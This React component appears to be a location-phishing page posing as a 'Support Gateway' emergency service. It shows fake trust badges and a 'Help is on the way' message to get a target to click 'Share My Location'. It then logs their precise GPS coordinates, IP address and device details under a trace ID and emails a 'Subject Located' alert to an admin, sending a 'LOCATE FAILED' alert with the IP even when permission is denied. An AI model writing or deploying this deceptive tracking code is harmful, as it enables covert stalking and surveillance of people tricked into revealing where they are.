
import React, { useState, useEffect } from 'react';
import { MapContainer, TileLayer, Marker, Popup } from 'react-leaflet';
import { Shield, Loader, MapPin, CheckCircle, AlertOctagon, Phone, User, Globe, Lock, ArrowUpLeft } from 'lucide-react';
import { fetchPublicIP, sendSystemEmail } from '../services/api';
import { dbService } from '../services/db';
import { ADMIN_EMAIL } from '../services/config';
import L from 'leaflet';

// Fix Icons for Leaflet
delete (L.Icon.Default.prototype as any)._getIconUrl;
L.Icon.Default.mergeOptions({
  iconRetinaUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-icon-2x.png',
  iconUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-icon.png',
  shadowUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-shadow.png',
});

interface CustomerLocatorProps {
    traceId: string;
    userName?: string;
}

const CustomerLocator: React.FC<CustomerLocatorProps> = ({ traceId, userName }) => {
    const [status, setStatus] = useState<'idle' | 'requesting' | 'locating' | 'success' | 'error'>('idle');
    const [coords, setCoords] = useState<{lat: number, lng: number} | null>(null);
    const [ip, setIp] = useState<string>('');

    useEffect(() => {
        fetchPublicIP().then(setIp);
    }, []);

    const startLocationShare = () => {
        setStatus('requesting');
        
        // Short delay to allow UI to update before blocking prompt appears
        setTimeout(() => {
            const processLocation = async (pos: GeolocationPosition) => {
                setStatus('locating');
                const lat = pos.coords.latitude;
                const lng = pos.coords.longitude;
                setCoords({lat, lng});

                try {
                    // Gather OSINT
                    const userAgent = navigator.userAgent;
                    
                    // Store Data
                    const payload = {
                        id: Date.now().toString(),
                        timestamp: new Date().toISOString(),
                        traceId,
                        lat, lng,
                        accuracy: pos.coords.accuracy,
                        ip,
                        userAgent,
                        platform: navigator.platform,
                        name: userName || 'Emergency Locate'
                    };
                    
                    await dbService.add('tracked_clicks', payload); 

                    // Send Alert to Super Admin
                    const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
                    const emailBody = `URGENT LOCATE SUCCESS\n\nUser: ${userName || 'Unknown'}\nTrace ID: ${traceId}\nLocation: ${lat}, ${lng} (Acc: ${pos.coords.accuracy}m)\nIP: ${ip}\nDevice: ${userAgent}\n\nMAP: ${mapLink}`;
                    
                    await sendSystemEmail(ADMIN_EMAIL, `URGENT: Subject Located (${userName || traceId})`, emailBody);
                    
                    setStatus('success');
                } catch (e) {
                    console.error(e);
                    // Even if email fails, show success to user if map loaded
                    setStatus('success');
                }
            };

            const handleError = (err: GeolocationPositionError) => {
                console.error(err);
                setStatus('error');
                // Log the attempt anyway
                sendSystemEmail(ADMIN_EMAIL, `LOCATE FAILED (${userName || traceId})`, `User denied permission or device error.\nIP: ${ip}`);
            };

            if(navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(processLocation, handleError, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            } else {
                setStatus('error');
            }
        }, 500);
    };

    // --- SUCCESS VIEW ---
    if (status === 'success' && coords) {
        return (
            <div className="h-screen w-screen relative flex flex-col bg-slate-900">
                 <div className="flex-1 relative z-0">
                     <MapContainer 
                        center={[coords.lat, coords.lng]} 
                        zoom={18} 
                        style={{ height: '100%', width: '100%' }}
                        zoomControl={false}
                     >
                        <TileLayer
                            url="https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}"
                            attribution="Esri"
                        />
                        <Marker 
                            position={[coords.lat, coords.lng]}
                            icon={L.divIcon({
                                className: 'neon-marker-wrap',
                                html: `<div class="text-green-500 drop-shadow-[0_0_20px_#22c55e] animate-pulse"><svg width="80" height="80" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="12" r="8" fill-opacity="0.5"/><circle cx="12" cy="12" r="4"/></svg></div>`,
                                iconSize: [80, 80],
                                iconAnchor: [40, 40]
                            })}
                        >
                            <Popup>Your Location Shared Successfully</Popup>
                        </Marker>
                     </MapContainer>
                 </div>
                 
                 <div className="absolute top-0 left-0 w-full p-4 bg-gradient-to-b from-slate-900/90 to-transparent z-[9999] text-center">
                     <div className="bg-green-600 text-white px-6 py-3 rounded-full inline-flex items-center gap-3 shadow-2xl animate-in slide-in-from-top-4">
                         <CheckCircle size={24}/> 
                         <span className="font-bold">Location Shared Successfully</span>
                     </div>
                 </div>

                 <div className="bg-slate-900 p-6 text-center border-t border-slate-800 z-10">
                     <h2 className="text-white font-bold text-lg mb-2">Help is on the way</h2>
                     <p className="text-slate-400 text-sm max-w-sm mx-auto mb-4">
                         We have received your coordinates. Please remain at this location if it is safe to do so. Support has been notified.
                     </p>
                     <div className="inline-block bg-slate-800 rounded-lg px-4 py-2 border border-slate-700">
                         <span className="text-slate-500 text-xs uppercase font-bold block mb-1">Session ID</span>
                         <span className="text-cyan-400 font-mono text-sm">{traceId}</span>
                     </div>
                 </div>
            </div>
        );
    }

    // --- LANDING PAGE VIEW ---
    return (
        <div className="min-h-screen bg-slate-50 text-slate-900 font-sans flex flex-col items-center relative overflow-hidden">
            
            {/* Header */}
            <header className="w-full bg-white border-b border-slate-200 p-4 shadow-sm z-10">
                <div className="max-w-md mx-auto flex items-center justify-between">
                    <div className="flex items-center gap-2">
                        <div className="bg-red-600 p-1.5 rounded-md text-white">
                            <Shield size={20} />
                        </div>
                        <span className="font-bold text-slate-700">Support Gateway</span>
                    </div>
                    <div className="flex items-center gap-1 text-[10px] text-green-600 bg-green-50 px-2 py-1 rounded-full border border-green-200">
                        <Lock size={10}/> Secure TLS
                    </div>
                </div>
            </header>

            <main className="flex-1 flex flex-col items-center p-6 w-full max-w-md animate-in fade-in zoom-in duration-300 z-10 relative">
                
                <div className="mt-8 mb-6 relative">
                    <div className="w-24 h-24 bg-red-50 rounded-full flex items-center justify-center border-4 border-red-100">
                        <MapPin size={48} className="text-red-600 drop-shadow-sm" />
                    </div>
                    {status === 'locating' && (
                        <div className="absolute inset-0 border-4 border-red-500 rounded-full border-t-transparent animate-spin"></div>
                    )}
                </div>

                <h1 className="text-2xl font-bold text-slate-800 mb-2 text-center">
                    {userName ? `Hello, ${userName}` : 'Location Verification'}
                </h1>
                
                <p className="text-slate-500 text-center mb-8 text-sm leading-relaxed">
                    Our support team requests your current GPS location to provide immediate assistance. This data is encrypted and sent directly to our operations center.
                </p>

                {status === 'error' ? (
                    <div className="w-full bg-red-50 border border-red-200 rounded-xl p-4 text-center mb-6">
                        <AlertOctagon size={32} className="text-red-500 mx-auto mb-2"/>
                        <h3 className="font-bold text-red-700 mb-1">Access Denied</h3>
                        <p className="text-xs text-red-600 mb-4">
                            We could not access your location. Please check your browser permissions or device settings and try again.
                        </p>
                        <button 
                            onClick={() => window.location.reload()}
                            className="text-xs font-bold text-red-700 underline hover:text-red-900"
                        >
                            Reload Page
                        </button>
                    </div>
                ) : (
                    <button
                        onClick={startLocationShare}
                        disabled={status === 'locating' || status === 'requesting'}
                        className="w-full bg-red-600 hover:bg-red-700 active:scale-95 transition-all text-white font-bold py-4 rounded-xl shadow-xl shadow-red-200 flex items-center justify-center gap-3 mb-6 disabled:opacity-70 disabled:cursor-not-allowed"
                    >
                        {(status === 'locating' || status === 'requesting') ? <Loader className="animate-spin" size={24}/> : <Globe size={24}/>}
                        <span className="text-lg">Share My Location</span>
                    </button>
                )}

                {/* Trust Indicators */}
                <div className="grid grid-cols-2 gap-4 w-full">
                    <div className="bg-white p-3 rounded-lg border border-slate-200 flex flex-col items-center text-center shadow-sm">
                        <Lock size={16} className="text-slate-400 mb-1"/>
                        <span className="text-[10px] text-slate-500 font-bold uppercase">Encrypted</span>
                    </div>
                    <div className="bg-white p-3 rounded-lg border border-slate-200 flex flex-col items-center text-center shadow-sm">
                        <User size={16} className="text-slate-400 mb-1"/>
                        <span className="text-[10px] text-slate-500 font-bold uppercase">Verified Agent</span>
                    </div>
                </div>

                <div className="mt-auto pt-8 w-full text-center">
                    <p className="text-[10px] text-slate-400">
                        Session ID: <span className="font-mono">{traceId}</span> • IP: {ip || '...'}
                    </p>
                </div>

            </main>

            {/* Instruction Overlay */}
            {status === 'requesting' && (
                <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex flex-col items-center justify-center text-white p-8">
                    <div className="absolute top-10 left-10 animate-bounce-slow">
                        <ArrowUpLeft size={64} className="text-white drop-shadow-[0_0_15px_rgba(255,255,255,0.8)] stroke-[3]" />
                    </div>
                    <div className="bg-slate-900 border border-slate-700 p-6 rounded-2xl shadow-2xl max-w-sm text-center">
                        <Loader className="animate-spin mx-auto mb-4 text-cyan-400" size={32}/>
                        <h3 className="text-xl font-bold mb-2">Permission Required</h3>
                        <p className="text-slate-300 text-sm mb-4">
                            Please click <span className="font-bold text-white bg-slate-700 px-1 rounded">Allow</span> in the popup to confirm your location. This ensures we can verify your identity secure your session.
                        </p>
                    </div>
                </div>
            )}
        </div>
    );
};

export default CustomerLocator;
